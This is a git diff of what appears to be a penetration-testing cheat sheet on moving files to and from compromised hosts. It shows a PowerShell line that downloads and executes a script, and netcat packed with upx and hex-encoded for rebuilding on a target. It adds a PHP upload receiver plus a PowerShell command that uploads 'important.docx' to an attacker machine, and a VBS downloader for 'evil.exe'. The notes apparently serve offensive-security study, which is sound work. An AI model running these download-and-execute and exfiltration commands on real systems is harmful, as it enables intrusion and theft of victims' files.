@@ -18,6 +18,21 @@ PS:IEX (New-Object System.Net.WebClient).DownloadString('path/d_f.ps1') -- Cant 
 upx -9 nc.exe(compress to be smaller)
 exe2hex -x nc.exe -p nc.cmd(convert the file to hex and instruct powershell.exe to assemble it back into binary)
 ```
+#### Upload Files using enabled outbound http traffic
+```
+save upload.php under kali /var/www/html
+<?php
+$uploaddir = '/var/www/uploads/';
+
+$uploadfile = $uploaddir . $_FILES['file']['name'];
+
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+?>
+sudo mkdir /var/www/uploads
+ps -ef | grep apache
+sudo chown www-data: /var/www/uploads
+powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
+```
 
 ### SCP Copy file from remote machine to local tmp
 scp john@localhost:/var/tmp/CopyMe.txt /tmp  
@@ -63,7 +78,7 @@ Authentication first
 2. get filename/put filename
 ```
 
-### vbs
+### VBS to download files
 usage: cscript wget.vbs http://10.11.0.4/evil.exe evil.exe(outfile)
 ```
 strUrl = WScript.Arguments.Item(0)
